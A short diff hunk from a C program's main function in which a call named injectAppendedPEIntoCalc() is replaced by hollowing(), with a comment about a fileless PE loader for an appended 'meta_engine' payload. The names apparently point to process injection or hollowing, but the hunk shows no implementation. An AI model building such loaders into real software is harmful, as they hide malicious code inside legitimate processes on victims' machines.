@@ -40,7 +40,7 @@ int main() {
     // call to fileless pe loader for meta_engine.c at the end of the current pe
 
     printf("Trying to create process: Prayge\n");
-    injectAppendedPEIntoCalc();
+    hollowing();
 
     return 0;
 }
